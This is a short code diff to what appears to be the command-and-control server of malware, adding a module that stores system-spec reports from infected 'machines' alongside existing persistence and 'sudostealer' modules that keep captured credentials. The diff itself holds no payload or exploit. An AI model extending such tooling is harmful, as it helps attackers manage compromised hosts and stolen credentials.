@@ -13,6 +13,10 @@ class SudostealerModule(BaseModel):
 	enabled: bool = False
 	credentials: list[str] = []
 
+class SpecsModule(BaseModel):
+	timestamp: int = -1
+	report: dict = {}
+
 class Machine(BaseModel):
 	id: str
 	version: int
@@ -20,6 +24,7 @@ class Machine(BaseModel):
 	connected: bool = False
 	persistence: PersistenceModule = PersistenceModule()
 	sudostealer: SudostealerModule = SudostealerModule()
+	specs: SpecsModule = SpecsModule()
 
 	async def on_register(self, host):
 		self._register_connection(host)
@@ -84,6 +89,10 @@ class Machine(BaseModel):
 				i.pending.remove(self.id)
 				i.done.append(self.id)
 				await con.broadcast_order_update(i)
+	
+	def update_specs(self, report):
+		self.specs.timestamp = int(datetime.now().timestamp())
+		self.specs.report = report
 
 
 os.makedirs("data/machines", exist_ok=True)
